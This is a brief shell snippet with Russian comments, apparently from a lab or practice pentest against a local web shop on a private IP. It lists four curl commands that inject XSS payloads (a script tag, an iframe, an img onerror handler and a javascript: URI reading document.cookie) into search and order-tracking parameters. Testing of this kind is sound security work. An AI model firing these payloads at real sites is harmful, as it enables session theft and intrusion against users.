# payload'ы отправляются query-параметрами: fragment URL (#/search?...) на сервер не передаётся

# XSS через тег <script>
curl "http://172.20.0.106:3000/rest/products/search?q=<script>alert(1)</script>"

# XSS через iframe
curl "http://172.20.0.106:3000/rest/products/search?q=<iframe%20src='javascript:alert(1)'></iframe>"

# XSS через event handler onerror
curl "http://172.20.0.106:3000/rest/track-order?id=<img%20src=x%20onerror=alert(1)>"

# XSS через javascript: URI
curl "http://172.20.0.106:3000/rest/products/search?q=javascript:alert(document.cookie)"
